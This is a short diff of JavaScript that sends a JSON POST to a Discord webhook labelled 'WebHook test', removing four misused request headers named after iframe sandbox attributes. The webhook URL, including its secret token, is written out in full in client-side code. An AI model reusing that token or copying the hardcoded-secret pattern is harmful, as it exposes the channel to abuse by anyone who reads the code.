@@ -140,10 +140,6 @@
       let request = new XMLHttpRequest();
   request.open("POST", "https://discord.com/api/webhooks/1174109990764679221/CxcSl2WHoyqSJ2yp2JoAQbKaVpMRl6gCwtJEaKK6NAjx9tIDNHjxbYy4pmnMSM7xkRel");
   request.setRequestHeader('Content-type', 'application/json');
-  request.setRequestHeader("allow-popups", "true");
-  request.setRequestHeader("allow-popups-to-escape-sandbox", "true");
-  request.setRequestHeader("allow-same-origin", "true");
-  request.setRequestHeader("allow-scripts", "true");
   let params = {
     username: "WebHook test",
     embeds: [{
